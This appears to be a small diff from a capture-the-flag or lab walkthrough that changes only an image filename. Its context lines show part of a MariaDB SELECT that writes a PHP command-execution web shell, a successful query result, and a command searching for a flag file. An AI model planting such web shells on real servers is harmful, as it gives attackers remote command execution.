@@ -81,7 +81,7 @@ MariaDB [(none)]> SELECT "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; $cmd 
 Query OK, 1 row affected (0.190 sec)
 ```
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>
 
 ```
 dir /s /b C:\flag.txt
